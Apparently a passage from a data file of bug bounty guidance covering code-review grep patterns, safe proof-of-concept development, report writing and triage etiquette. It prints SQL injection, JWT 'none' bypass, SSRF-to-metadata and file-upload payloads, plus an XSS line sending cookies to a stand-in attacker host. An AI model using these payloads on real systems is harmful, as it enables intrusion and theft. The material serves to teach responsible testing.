grep -r \"system(\" .
grep -r \"passthru(\" .
grep -r \"shell_exec(\" .
grep -r \"unserialize(\" .

# JavaScript dangerous patterns
grep -r \"eval(\" *.js
grep -r \"innerHTML =\" *.js
grep -r \"document.write(\" *.js
grep -r \"dangerouslySetInnerHTML\" *.jsx

# Python dangerous functions
grep -r \"eval(\" *.py
grep -r \"exec(\" *.py
grep -r \"pickle.loads(\" *.py
grep -r \"yaml.load(\" *.py

# SQL injection prone patterns
grep -r \"\\$_GET\" . | grep -E \"(SELECT|INSERT|UPDATE|DELETE)\"
grep -r \"request.GET\" . | grep -E \"(execute|raw)\"
```

6. Target-Specific Research:

CVE Research for Technologies:
```bash
# Search CVEs for identified technologies
# Example: WordPress 5.8.1
searchsploit wordpress 5.8.1
curl \"https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=wordpress+5.8.1\"

# GitHub security advisories
curl \"https://api.github.com/search/repositories?q=wordpress+vulnerability\"

# Exploit-DB search
curl \"https://www.exploit-db.com/search?q=wordpress\"

# NVD search
curl \"https://services.nvd.nist.gov/rest/json/cves/1.0?keyword=wordpress\"
```

Similar Target Research:
```bash
# Find similar targets on bug bounty platforms
# Search disclosed reports for same technology stack
# HackerOne: https://hackerone.com/hacktivity?querystring=wordpress
# Bugcrowd: https://bugcrowd.com/programs → filter by technology

# Learn from writeups
# Search Medium, GitHub, personal blogs
# \"site:medium.com wordpress vulnerability bug bounty\"
# \"site:github.com wordpress bug bounty writeup\"
```

WHAT TO LOOK FOR:
- **High-Severity Findings**: RCE, SQL injection, authentication bypass, SSRF (typically $5K-$20K)
- **Chained Vulnerabilities**: XSS → Session hijacking, IDOR → privilege escalation (increases severity/bounty)
- **Business Logic Flaws**: Payment manipulation, race conditions, broken access control (often missed by scanners)
- **API Vulnerabilities**: Broken object level authorization, mass assignment, GraphQL introspection
- **Authentication Issues**: JWT algorithm confusion, OAuth misconfiguration, 2FA bypass, password reset flaws
- **Unique Findings**: Application-specific vulnerabilities not in common scanner databases

SECURITY IMPLICATIONS:
- **Testing Boundaries**: Never test destructive operations in production (DELETE user, DROP table)
- **Data Protection**: Don't access or exfiltrate actual customer data (use test accounts)
- **Service Impact**: Rate limit your testing to avoid DoS (use --rate-limit, sleep between requests)
- **Legal Compliance**: Stay within program scope and rules of engagement
- **Responsible Disclosure**: Report immediately upon discovery, don't exploit for personal gain

COMMON PITFALLS:
- **Scanner-Only Testing**: Relying entirely on automated tools missing business logic and chained vulnerabilities
- **Duplicate Submissions**: Not checking disclosed reports before testing common vulnerabilities
- **Low-Quality Findings**: Reporting informational issues (missing headers, descriptive errors) as high severity
- **Poor Impact Demonstration**: Submitting vulnerabilities without clear proof-of-concept or impact explanation
- **Scope Violations**: Testing out-of-scope endpoints because \"they're connected\"
- **Noisy Testing**: Sending thousands of requests per second triggering WAF blocks
- **Giving Up Too Early**: Testing only login page, missing vulnerabilities in complex workflows
- **No Creativity**: Only testing OWASP Top 10, missing application-specific logic flaws

TOOLS REFERENCE:
- **Burp Suite**: https://portswigger.net/burp (web vulnerability scanner)
- **Nuclei**: https://github.com/projectdiscovery/nuclei (template-based scanner)
- **SQLMap**: https://sqlmap.org/ (SQL injection automation)
- **XSStrike**: https://github.com/s0md3v/XSStrike (XSS scanner)
- **ffuf**: https://github.com/ffuf/ffuf (fast web fuzzer)
- **Burp Collaborator**: https://portswigger.net/burp/documentation/collaborator (OOB interaction testing)
- **Dalfox**: https://github.com/hahwul/dalfox (XSS parameter analysis)
- **Jaeles**: https://github.com/jaeles-project/jaeles (automated testing framework)

FURTHER READING:
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- Bug Bounty Playbook by Vickie Li: https://www.amazon.com/Bug-Bounty-Playbook-World-Class-Vulnerability/dp/1718502648
- PentesterLab: https://pentesterlab.com/ (hands-on vulnerability practice)
- HackerOne Disclosed Reports: https://hackerone.com/hacktivity
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings"
    ),
    (
        "Proof-of-concept development",
        "OBJECTIVE: Create clear, reproducible proof-of-concept demonstrations that validate vulnerabilities without causing harm to production systems or accessing sensitive data.

ACADEMIC BACKGROUND:
NIST SP 800-115 Section 7.4 emphasizes safe exploitation techniques. ISO 29147 requires non-destructive proof-of-concept. Bugcrowd Vulnerability Rating Taxonomy (VRT) defines impact demonstration requirements. HackerOne Good Report Guide specifies PoC best practices.

STEP-BY-STEP PROCESS:

1. Safe PoC Development Principles:

Core Safety Rules:
```text
✓ DO: Demonstrate impact minimally
✓ DO: Use test accounts you created
✓ DO: Document every step clearly
✓ DO: Stop after proving vulnerability exists
✓ DO: Test in isolated/staging environments when possible

✗ DON'T: Access real customer data
✗ DON'T: Modify production databases
✗ DON'T: Delete or corrupt data
✗ DON'T: Chain exploits beyond necessary proof
✗ DON'T: Exfiltrate actual sensitive information
✗ DON'T: Test during peak business hours
✗ DON'T: Execute commands that could cause system instability
```

2. SQL Injection PoC:

Safe Demonstration:
```bash
# WRONG: Extracting entire database
sqlmap -u \"https://example.com/search?id=1\" --dump-all

# RIGHT: Prove vulnerability exists with minimal query
# Step 1: Identify injection point
curl \"https://example.com/search?id=1'\" 
# Error: \"You have an error in your SQL syntax\"

# Step 2: Confirm with basic payload
curl \"https://example.com/search?id=1' AND '1'='1\"
# Response: Normal content

curl \"https://example.com/search?id=1' AND '1'='2\"  
# Response: Empty or error (proves SQL execution)

# Step 3: Demonstrate impact with sleep
curl \"https://example.com/search?id=1' AND SLEEP(5)--\"
# Response time: 5+ seconds (proves command execution)

# Step 4: Extract version/database name ONLY
curl \"https://example.com/search?id=1' UNION SELECT @@version,database(),NULL--\"
# Response shows: MySQL 5.7.32, database: prod_db

# STOP HERE - Don't extract user tables, passwords, etc.
```

Report Format:
```text
TITLE: SQL Injection in Search Parameter

DESCRIPTION:
The search functionality at /search is vulnerable to SQL injection, allowing attackers to execute arbitrary SQL commands.

REPRODUCTION STEPS:
1. Visit https://example.com/search?id=1'
2. Observe SQL error message: \"You have an error in your SQL syntax\"
3. Confirm injection with: id=1' AND SLEEP(5)--
4. Response delays 5 seconds, confirming SQL execution
5. Database version extracted: MySQL 5.7.32

IMPACT: Attackers can extract entire database including user credentials, personal information, and payment data.

EVIDENCE: [Screenshot of SQL error, timing difference, version extraction]
```

3. XSS PoC Development:

Safe Payload Examples:
```bash
# Basic alert PoC
<script>alert(document.domain)</script>

# Proof of execution without theft
<script>alert('XSS by [your_username] - PoC only')</script>

# Demonstrate cookie access (without stealing)
<script>alert('Cookies accessible: ' + document.cookie.substring(0,50))</script>

# WRONG: Actual cookie stealing
<script>fetch('https://attacker.com/?c='+document.cookie)</script>

# RIGHT: Log to console instead
<script>console.log('XSS PoC - Cookie:', document.cookie)</script>
```

Stored XSS PoC:
```text
REPRODUCTION STEPS:
1. Login to https://example.com/login with test account
2. Navigate to profile edit at /profile/edit
3. Enter payload in \"Bio\" field:
   <img src=x onerror=\"alert('XSS PoC by [username]')\">
4. Save profile
5. Visit public profile at /users/testuser
6. JavaScript executes, showing alert

IMPACT: Attackers can inject malicious scripts viewed by all users, enabling session hijacking, credential theft, and defacement.
```

4. Authentication Bypass PoC:

JWT Token Manipulation:
```bash
# Step 1: Obtain JWT token
curl -X POST https://example.com/api/login \\
  -H \"Content-Type: application/json\" \\
  -d '{\"username\":\"test@example.com\",\"password\":\"test123\"}'

# Response: {\"token\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\"}

# Step 2: Decode token (jwt.io or jwt-tool)
jwt-tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# Payload shows: {\"user_id\": 123, \"role\": \"user\"}

# Step 3: Test algorithm confusion attack
# Change \"alg\": \"HS256\" to \"alg\": \"none\"
# Remove signature
# Payload: {\"user_id\": 123, \"role\": \"admin\"}

# Step 4: Test with modified token
curl https://example.com/api/admin/users \\
  -H \"Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0...\"

# SUCCESS: Admin endpoint accessible with modified token
```

5. IDOR PoC:

Step-by-Step Documentation:
```text
TITLE: IDOR in User Profile Access

SETUP:
1. Create two test accounts:
   - Account A: test1@example.com (ID: 1001)
   - Account B: test2@example.com (ID: 1002)

REPRODUCTION:
1. Login as Account A
2. Access own profile: GET /api/users/1001/profile
   Response: {\"email\":\"test1@example.com\",\"name\":\"Test User 1\"}
   
3. Change user ID to 1002: GET /api/users/1002/profile
   Response: {\"email\":\"test2@example.com\",\"name\":\"Test User 2\"}
   
4. Successfully accessed Account B's data while authenticated as Account A

IMPACT: Any authenticated user can access/modify other users' profiles by changing the user ID parameter. Tested with accounts I created - real user data is at risk.

EVIDENCE: [Screenshots of requests/responses, Burp Suite history]
```

6. SSRF PoC:

Safe Internal Service Access:
```bash
# Test for SSRF in image upload/URL fetch
curl -X POST https://example.com/api/fetch-image \\
  -d \"url=http://127.0.0.1:80\"

# Response reveals internal service
# Status: 200, Content: Apache default page

# Test internal network access
curl -X POST https://example.com/api/fetch-image \\
  -d \"url=http://169.254.169.254/latest/meta-data/\"

# AWS metadata accessible - proves SSRF

# STOP HERE - Don't extract actual credentials
# Don't access http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Report:
```text
IMPACT: SSRF allows attackers to:
- Access internal services (databases, admin panels)
- Read AWS/GCP/Azure metadata (cloud credentials)
- Scan internal network
- Bypass IP whitelisting

DEMONSTRATED: Successfully accessed AWS metadata endpoint, confirming internal network accessibility.

RECOMMENDATION: Implement allowlist of accessible domains, validate and sanitize URLs, block access to internal IPs (127.0.0.1, 169.254.x.x, 10.x.x.x, 192.168.x.x).
```

7. File Upload PoC:

Safe Web Shell Demonstration:
```bash
# Create harmless test file
cat > test_poc.php << 'EOF'
<?php
// PoC by [your_username] - Bug Bounty Report #XXXXX
// This file only echoes text - no malicious operations
echo \"File upload vulnerability confirmed. PHP execution possible.\";
phpinfo(); // Show server info
?>
EOF

# Upload file
curl -F \"file=@test_poc.php\" https://example.com/upload

# Response: {\"url\": \"https://example.com/uploads/test_poc.php\"}

# Access uploaded file
curl https://example.com/uploads/test_poc.php

# Output shows phpinfo() - proves PHP execution

# CLEAN UP: Request removal of test file
# Contact security team to delete test_poc.php
```

8. Evidence Collection Best Practices:

Screenshots:
```text
✓ Full browser window showing URL bar
✓ Timestamp visible (system tray, browser)
✓ Request/response in Burp Suite
✓ Developer console showing errors/XSS execution
✓ Network tab showing request timing (SQLi delays)
✓ Annotate screenshots with arrows/highlights

✗ Cropped images without context
✗ Missing URL/timestamp
✗ Blurry or unreadable text
✗ Screenshots without reproduction steps
```

HTTP Request/Response:
```bash
# Save full HTTP traffic
# Burp Suite: Right-click → \"Copy as curl command\"
curl 'https://example.com/api/endpoint' \\
  -H 'Authorization: Bearer token123' \\
  -H 'Content-Type: application/json' \\
  --data-raw '{\"user_id\":\"123\"}'

# Response
HTTP/1.1 200 OK
Content-Type: application/json

{\"email\":\"victim@example.com\",\"role\":\"admin\"}
```

Video PoC (For Complex Issues):
```text
WHEN TO USE VIDEO:
- Multi-step reproduction
- Race conditions requiring timing
- Complex UI interactions
- Real-time demonstrations (XSS, clickjacking)

TOOLS:
- OBS Studio (free, cross-platform)
- Loom (quick browser recording)
- Asciinema (terminal recording)

VIDEO GUIDELINES:
- Keep under 3 minutes
- Show URL bar throughout
- Narrate steps clearly
- Upload to private YouTube/Vimeo
- Provide link in report
```

9. Reproducibility Testing:

Validation Checklist:
```bash
# Test PoC in different scenarios
1. Different browser (Chrome, Firefox, Safari)
2. Different user account (create second test account)
3. Incognito/private browsing mode
4. Different IP address (VPN, mobile network)
5. Different time of day (cache issues)

# Document reproduction rate
\"Reproduced successfully 5/5 attempts across Chrome and Firefox\"
\"Intermittent issue: reproduced 3/5 attempts (may be timing-dependent)\"
```

WHAT TO LOOK FOR:
- **Clear Reproduction Steps**: Anyone following steps should reach same result
- **Minimal Impact**: Prove vulnerability without causing damage
- **Complete Evidence**: Screenshots, HTTP traffic, video demonstrating issue
- **Isolated Testing**: Use test accounts, avoid real user data
- **Reproducibility**: Consistent results across different tests

SECURITY IMPLICATIONS:
- **Data Protection**: Never access actual customer data (PII, credentials, payment info)
- **Service Availability**: Avoid testing that could cause downtime or degradation
- **Legal Compliance**: PoC must stay within bug bounty program rules
- **Ethics**: Demonstrate minimum required to prove vulnerability

COMMON PITFALLS:
- **Destructive Testing**: Deleting data, dropping tables, creating admin accounts (unless explicitly allowed with rollback)
- **Data Exfiltration**: Downloading customer databases, stealing credentials
- **Incomplete Steps**: \"Change parameter and you'll see\" - missing exact payload and expected result
- **No Evidence**: Claiming vulnerability exists without screenshots or HTTP traffic
- **Over-Exploitation**: Chaining 5 vulnerabilities when 1 proves the point
- **Production Testing**: Testing payment flows with real transactions
- **Unclear Impact**: Not explaining business consequences of vulnerability
- **Complex PoCs**: Requiring special setup making triage difficult

TOOLS REFERENCE:
- **Burp Suite**: https://portswigger.net/burp (HTTP interception and testing)
- **JWT.io**: https://jwt.io/ (JWT token decoder)
- **jwt-tool**: https://github.com/ticarpi/jwt_tool (JWT analysis)
- **Postman**: https://www.postman.com/ (API testing and documentation)
- **OBS Studio**: https://obsproject.com/ (video recording)
- **Asciinema**: https://asciinema.org/ (terminal recording)

FURTHER READING:
- HackerOne Report Writing: https://docs.hackerone.com/en/articles/8518652-writing-a-good-report
- Bugcrowd VRT: https://bugcrowd.com/vulnerability-rating-taxonomy
- NIST SP 800-115 Section 7.4: https://csrc.nist.gov/publications/detail/sp/800-115/final"
    ),
    (
        "Report writing & submission",
        "OBJECTIVE: Write professional, comprehensive vulnerability reports that clearly communicate the issue, impact, and remediation steps to security teams for efficient triage and resolution.

ACADEMIC BACKGROUND:
CVSS v3.1 provides standardized severity scoring (https://www.first.org/cvss/). CWE (Common Weakness Enumeration) classifies vulnerability types (https://cwe.mitre.org/). HackerOne Report Template guides effective structure. Bugcrowd VRT (Vulnerability Rating Taxonomy) standardizes impact assessment.

STEP-BY-STEP PROCESS:

1. Report Structure Template:

Essential Components:
```text
TITLE: [Vulnerability Type] in [Specific Feature]
Example: \"SQL Injection in Search Functionality\"
NOT: \"Critical Bug Found\" or \"Security Issue\"

SEVERITY: Critical / High / Medium / Low
(Based on CVSS calculation or platform severity guide)

DESCRIPTION:
- What is the vulnerability?
- Where is it located?
- Why is it a security issue?

REPRODUCTION STEPS:
1. Navigate to...
2. Enter payload...
3. Observe result...
(Numbered, specific, reproducible)

PROOF-OF-CONCEPT:
- HTTP requests/responses
- Screenshots
- Video (if necessary)
- Code snippets

IMPACT:
- What can an attacker do?
- What data is at risk?
- Business consequences

AFFECTED URLS/ENDPOINTS:
- https://example.com/vulnerable-endpoint
- API: POST /api/v1/search

REMEDIATION:
- Specific fix recommendations
- Code examples (if applicable)
- References to security best practices
```

2. Title Best Practices:

Good Titles:
```text
✓ \"SQL Injection in Search Parameter Allows Database Extraction\"
✓ \"Stored XSS in User Profile Bio Field\"
✓ \"IDOR in /api/users/{id} Exposes All User Profiles\"
✓ \"Authentication Bypass via JWT Algorithm Confusion\"
✓ \"SSRF in Image Upload Enables AWS Metadata Access\"
```

Bad Titles:
```text
✗ \"Security Vulnerability Found\"
✗ \"Urgent Bug\"
✗ \"Critical Issue - Please Fix\"
✗ \"XSS\" (too vague)
✗ \"Bug in Website\" (no specifics)
```

3. Reproduction Steps Writing:

Detailed Example (SQL Injection):
```text
REPRODUCTION STEPS:

Prerequisites:
- Any user account (no special privileges required)
- Web browser or curl command-line tool

Steps to Reproduce:
1. Navigate to https://example.com/search
2. Enter the following in the search box: test' OR '1'='1
3. Click \"Search\" button
4. Observe SQL error message: \"You have an error in your SQL syntax near ''1'='1'\"

5. Confirm vulnerability with time-based payload:
   Search query: test' AND SLEEP(5)--
   
6. Observe response time increases to 5+ seconds (normal: <1 second)

7. Extract database information:
   Search query: test' UNION SELECT @@version,database(),user()--
   
8. Response shows:
   - MySQL version: 5.7.32
   - Database name: production_db
   - User: root@localhost

Expected Result: Search should return filtered results only
Actual Result: SQL queries execute, allowing database access

Tested on:
- Browser: Chrome 118.0.5993.88
- Date: November 1, 2025
- IP: [Your IP for deduplication]
```

Clear vs Unclear Steps:
```text
✗ BAD:
\"1. Go to the website
2. Try SQL injection
3. You can access the database\"

✓ GOOD:
\"1. Navigate to https://example.com/search
2. Enter payload: ' OR '1'='1'--
3. Submit form
4. Observe SQL error in response
5. [Screenshot showing error message]\"
```

4. Impact Assessment and CVSS Scoring:

CVSS v3.1 Calculator:
```text
Attack Vector (AV):
- Network (N): Exploitable remotely
- Adjacent (A): Local network required
- Local (L): Physical/local access needed
- Physical (P): Physical interaction required

Attack Complexity (AC):
- Low (L): No special conditions
- High (H): Requires special conditions/timing

Privileges Required (PR):
- None (N): Unauthenticated attack
- Low (L): Basic user account
- High (H): Admin/privileged account required

User Interaction (UI):
- None (N): Fully automated attack
- Required (R): Victim must perform action

Scope (S):
- Unchanged (U): Impact limited to vulnerable component
- Changed (C): Impact beyond vulnerable component

Confidentiality/Integrity/Availability Impact (C/I/A):
- None (N): No impact
- Low (L): Limited information disclosure/modification
- High (H): Total information disclosure/modification

EXAMPLE - SQL Injection:
AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
Base Score: 10.0 (Critical)

EXAMPLE - Self-XSS:
AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
Base Score: 6.1 (Medium)
```

Impact Description Template:
```text
IMPACT:

Technical Impact:
- SQL injection allows complete database access
- Attacker can read all user records (10M+ users)
- Attacker can modify or delete data
- Potential for remote code execution via SQL procedures

Business Impact:
- Data breach affecting 10M+ users
- PII exposure: names, emails, addresses, phone numbers
- Payment data at risk (credit card last 4 digits, transaction history)
- Regulatory violations: GDPR (€20M fine), PCI DSS (loss of processing rights)
- Reputational damage and customer trust loss

Real-World Scenario:
An attacker could:
1. Extract entire user database
2. Access admin credentials
3. Compromise customer payment information
4. Cause financial and legal liability ($2-5M estimated breach cost)
```

5. Evidence Documentation:

Screenshot Guidelines:
```text
✓ Include full browser window with URL bar
✓ Show timestamp (system clock, browser)
✓ Highlight relevant sections (red boxes/arrows)
✓ Capture before/after states
✓ Include error messages completely
✓ Show Burp Suite request/response
✓ Multiple screenshots for multi-step process

✗ Cropped images without context
✗ Missing URL or timestamp
✗ Blurry or low-resolution
✗ No annotations or highlights
```

HTTP Traffic Documentation:
```bash
# Request
POST /api/search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Cookie: session=abc123

query=test' OR '1'='1'--

# Response
HTTP/1.1 500 Internal Server Error

Error: You have an error in your SQL syntax near ''1'='1'--'
```

6. Remediation Recommendations:

Good Remediation Advice:
```text
REMEDIATION:

Short-term Fix:
1. Implement prepared statements/parameterized queries
   
   BEFORE (Vulnerable):
   query = \"SELECT * FROM users WHERE name = '\" + userInput + \"'\"
   
   AFTER (Secure):
   query = \"SELECT * FROM users WHERE name = ?\"
   statement.setString(1, userInput)

2. Input validation and sanitization
   - Whitelist allowed characters
   - Reject special SQL characters: ' \" ; -- /* */

Long-term Recommendations:
1. Use ORM frameworks (prevent SQL injection by design)
2. Implement Web Application Firewall (WAF)
3. Regular security code reviews
4. Automated SAST/DAST scanning in CI/CD pipeline

References:
- OWASP SQL Injection Prevention: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
```

7. Platform-Specific Submission:

HackerOne Submission:
```text
1. Select program from dashboard
2. Click \"Submit Report\"
3. Fill in required fields:
   - Title (clear, specific)
   - Vulnerability Type (dropdown: SQL Injection, XSS, etc.)
   - Severity (use platform calculator)
   - Description (structured as above)
4. Attach evidence (screenshots, videos)
5. Add \"Weakness\" (CWE-89 for SQLi)
6. Submit and await triage

Best Practices:
- Use HackerOne's CVSS calculator
- Tag reports appropriately
- Include \"Impact\" section prominently
- Reference disclosed similar reports if helpful
```

Bugcrowd Submission:
```text
1. Navigate to program submission page
2. Select VRT category (e.g., \"Injection > SQL Injection\")
3. VRT automatically suggests severity
4. Fill required fields:
   - Title
   - Description with reproduction steps
   - Impact assessment
   - Proof-of-concept
5. Upload attachments
6. Review and submit

Bugcrowd-Specific:
- VRT categories auto-suggest severity
- \"Researcher Severity\" vs \"Actual Severity\" (triage team decides final)
- Use Bugcrowd Markdown formatting
```

8. Common Report Weaknesses to Avoid:

Incomplete Reports:
```text
✗ \"There's XSS on the site\"
  - Missing: Where? What payload? What's the impact?

✗ \"Change user ID and you can see other profiles\"
  - Missing: Exact endpoints, HTTP requests, screenshots

✗ \"SQL injection in search\"
  - Missing: Reproduction steps, proof, impact assessment
```

Over-Complicated Reports:
```text
✗ 20-page report for simple XSS
✗ Unnecessary technical jargon for business logic flaw
✗ Multiple vulnerabilities in one report (submit separately)
```

Missing Context:
```text
✗ No mention of severity/impact
✗ No remediation suggestions
✗ No CWE/OWASP references
✗ Unclear if vulnerability affects authenticated or unauthenticated users
```

9. Report Quality Checklist:

Before Submission:
```text
□ Clear, specific title
□ Vulnerability type identified (CWE/OWASP)
□ Reproduction steps numbered and detailed
□ Proof-of-concept included (screenshots/HTTP/video)
□ Impact clearly explained (technical + business)
□ CVSS score calculated (if required)
□ Remediation recommendations provided
□ Evidence attached (all screenshots/videos)
□ Tested reproduction steps on clean browser
□ Checked for duplicates in disclosed reports
□ Scope confirmed (asset is in-scope)
□ Grammar and spelling checked
□ Professional tone maintained
```

WHAT TO LOOK FOR:
- **Clarity**: Anyone reading should understand the issue immediately
- **Reproducibility**: Security team should reach same result following steps
- **Impact**: Business and technical consequences clearly stated
- **Evidence**: Screenshots, HTTP traffic, video supporting claims
- **Professionalism**: Clear writing, proper formatting, respectful tone

SECURITY IMPLICATIONS:
- **Accuracy**: Incorrect severity ratings waste triage time or underestimate risk
- **Completeness**: Missing information delays triage and payment
- **Professionalism**: Poor reports reflect on researcher reputation

COMMON PITFALLS:
- **Vague Titles**: \"Security Issue\" instead of \"SQL Injection in /search\"
- **Missing Steps**: \"Do SQL injection and access database\" without exact payloads
- **No Impact**: Describing vulnerability without explaining business consequences
- **Wrong Severity**: Rating self-XSS as Critical or server version disclosure as High
- **Multiple Issues**: Submitting 5 vulnerabilities in one report (submit separately for better tracking/payment)
- **No Evidence**: Claims without screenshots or HTTP traffic
- **Poor Writing**: Unprofessional language, typos, grammatical errors
- **Scope Ignorance**: Reporting out-of-scope assets or explicitly excluded vulnerability types

TOOLS REFERENCE:
- **CVSS Calculator**: https://www.first.org/cvss/calculator/3.1
- **CWE Database**: https://cwe.mitre.org/
- **Markdown Guide**: https://www.markdownguide.org/ (for report formatting)
- **Grammarly**: https://www.grammarly.com/ (writing quality)
- **HackerOne Report Template**: https://docs.hackerone.com/hackers/report-template.html

FURTHER READING:
- HackerOne Report Writing Guide: https://docs.hackerone.com/en/articles/8518652-writing-a-good-report
- Bugcrowd VRT: https://bugcrowd.com/vulnerability-rating-taxonomy
- Google VRP Report Quality Guide: https://bughunters.google.com/learn/invalid-reports
- OWASP Risk Rating Methodology: https://owasp.org/www-community/OWASP_Risk_Rating_Methodology"
    ),
    (
        "Triage & communication",
        "OBJECTIVE: Effectively communicate with security teams during the triage process, provide additional information when requested, and maintain professional relationships that lead to successful vulnerability resolution.

ACADEMIC BACKGROUND:
ISO 29147 Section 7.3 describes vulnerability information handling procedures. NIST SP 800-40 Rev. 4 covers patch management timelines. HackerOne State Guide explains triage workflow. Bugcrowd Response SLA defines expected communication timelines.

STEP-BY-STEP PROCESS:

1. Understanding Triage States:

HackerOne States:
```text
NEW → TRIAGED → RESOLVED → INFORMATIVE/DUPLICATE/NOT APPLICABLE

NEW: Report submitted, awaiting initial review (24-48 hours typical)
TRIAGED: Confirmed as valid vulnerability, accepted by team
NEEDS MORE INFO: Team requests additional details or clarification
RESOLVED: Vulnerability fixed and verified
INFORMATIVE: Valid observation but not security issue
DUPLICATE: Already reported by another researcher
NOT APPLICABLE: Out-of-scope or not a vulnerability
SPAM: Invalid report (can impact reputation)
```

Bugcrowd States:
```text
UNRESOLVED → TRIAGED → RESOLVED

UNRESOLVED: Initial submission
TRIAGED: Validated and prioritized
RESOLVED: Fixed and bounty awarded
WON'T FIX: Valid but team chooses not to fix (still may get bounty)
INFORMATIVE: Not a security issue
DUPLICATE: Previously reported
OUT-OF-SCOPE: Asset/vuln type not covered
```

2. Response to \"Needs More Information\":

Good Responses:
```text
TEAM REQUEST: \"Can you provide steps to reproduce in Firefox?\"

YOUR RESPONSE:
\"Hi [Security Team],

I've tested in Firefox 119.0.1 and can confirm the vulnerability reproduces identically:

1. Firefox 119.0.1 on Ubuntu 22.04
2. Navigate to https://example.com/search
3. Enter payload: test' OR '1'='1'--
4. SQL error appears in response

[Attached: firefox_screenshot.png showing error]

The vulnerability reproduces consistently across browsers. Let me know if you need any additional information!

Best regards,
[Your Name]\"
```

Bad Responses:
```text
✗ \"I already explained this in my report\"
✗ \"Just try it yourself\"
✗ \"It works on my machine\"
✗ [No response for 2 weeks]
```

3. Handling Duplicate Reports:

Professional Duplicate Response:
```text
TEAM: \"This was already reported by another researcher on Oct 15th.\"

YOUR RESPONSE:
\"Thank you for the update. I understand this is a duplicate.

For future reference, could you share:
1. Was the original report already disclosed? (I couldn't find it in hacktivity)
2. Any suggestions on improving my reconnaissance to catch duplicates earlier?

I appreciate the feedback and will be more thorough in checking for existing reports.

Best regards,
[Your Name]\"

KEY POINTS:
✓ Professional and understanding
✓ Request constructive feedback
✓ Show willingness to improve
✓ Don't argue or demand payment
```

4. Escalation Procedures:

When to Escalate (HackerOne):
```text
ESCALATE IF:
- No response after 7+ days (program SLA)
- Report marked informative but clearly valid
- Unfair duplicate classification
- Bounty significantly below guidelines
- Security team unresponsive to critical vulnerability

HOW TO ESCALATE:
1. HackerOne: Request mediation
   Click \"Request Mediation\" button
   Explain situation professionally
   Provide supporting evidence

2. Bugcrowd: Contact support
   Email: support@bugcrowd.com
   Reference report # and program
   Explain concern clearly
```

Professional Escalation Message:
```text
\"Hi HackerOne Mediation Team,

I'm requesting mediation for report #XXXXX submitted to [Program] on Oct 15th.

Situation:
- Report submitted 14 days ago
- Status: NEW (no triage response)
- Severity: Critical (CVSS 9.8)
- Program SLA: First response within 5 business days

I've sent two follow-up comments (Oct 20th, Oct 27th) with no response.

Request:
Could you please help facilitate communication with the security team?

Thank you for your assistance.

Best regards,
[Your Name]\"
```

5. Communication Best Practices:

Tone and Professionalism:
```text
✓ DO:
- Be patient and respectful
- Provide requested information promptly
- Thank team for their time
- Offer to test fixes
- Accept decisions gracefully

✗ DON'T:
- Use aggressive or demanding language
- Threaten public disclosure
- Spam comments asking for updates
- Argue with triage decisions
- Insult security team
- Compare yourself to other researchers
```

Example Professional Messages:
```text
FIX VERIFICATION OFFER:
\"Hi Team,

I see the vulnerability has been marked as resolved. I'd be happy to verify the fix if you'd like me to retest.

Please let me know if verification testing would be helpful.

Best regards\"

CLARIFICATION REQUEST:
\"Hi Team,

Thanks for triaging this report. I want to ensure I understand the concern you've raised.

Are you asking about [specific clarification]? If so, I can provide [additional info].

Please let me know if I've understood correctly.

Best regards\"

THANK YOU MESSAGE:
\"Hi Team,

Thank you for the $X,XXX bounty and quick resolution!

I enjoyed working on this program and look forward to future findings.

Best regards\"
```

6. Timeline Management:

Typical Timelines:
```text
FIRST RESPONSE: 24-72 hours (good programs)
TRIAGE: 3-7 days
FIX: 30-90 days (varies by severity and complexity)
BOUNTY PAYMENT: 7-30 days after resolution

CRITICAL VULNERABILITIES:
First response: <24 hours
Fix: 1-7 days (emergency patching)
Payment: Expedited

LOW SEVERITY:
Triage: 5-14 days
Fix: 90-180 days or \"won't fix\"
```

Following Up:
```text
✓ GOOD TIMING:
- Day 7: Polite check-in if no response
- Day 14: Second check-in or mediation request
- After fix: Offer to verify

✗ BAD TIMING:
- Day 1: \"Any updates?\"
- Multiple times per day
- Impatient demands for bounty
```

7. Handling Disagreements:

Severity Disagreements:
```text
TEAM: \"We're downgrading this from High to Medium\"

PROFESSIONAL RESPONSE:
\"Thank you for the update. I appreciate you taking time to review the severity.

I'd like to respectfully discuss the rating:

My Assessment (High):
- Vulnerability allows [specific impact]
- Affects [number/type of users]
- CVSS 7.5: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

Could you help me understand the Medium classification? This would help me better assess severity in future reports.

If the decision stands, I completely understand and accept it.

Thank you!\"
```

Won't Fix Decisions:
```text
TEAM: \"This is valid but we won't fix it due to [business reason]\"

PROFESSIONAL RESPONSE:
\"Thank you for explaining the decision.

I understand the business considerations. Would you still like me to:
1. Submit similar findings in other areas?
2. Focus on different vulnerability types?

I want to ensure my future reports align with program priorities.

Appreciate your guidance!\"
```

WHAT TO LOOK FOR:
- **Timely Responses**: Security teams respecting SLA commitments (first response <48h for quality programs)
- **Clear Communication**: Triage decisions explained with reasoning
- **Fair Treatment**: Consistent duplicate handling, severity assessment
- **Professional Relationship**: Mutual respect, constructive feedback

SECURITY IMPLICATIONS:
- **Disclosure Ethics**: Never threaten premature disclosure if unhappy with triage
- **Reputation**: Professional communication builds trust and invitations to private programs
- **Legal Protection**: Bug bounty safe harbor only applies when following program rules and timelines

COMMON PITFALLS:
- **Impatience**: Spamming \"any updates?\" every day instead of respecting triage timelines
- **Aggression**: Demanding bounties, threatening disclosure, insulting security teams
- **Poor Communication**: Not responding to \"Needs More Info\" requests promptly
- **Arguing**: Fighting every triage decision instead of learning and improving
- **Unprofessionalism**: Using slang, all-caps, exclamation marks excessively
- **Ghosting**: Submitting reports then disappearing when team needs clarification
- **Comparison**: \"Other researchers got $5K for this, I should too!\"
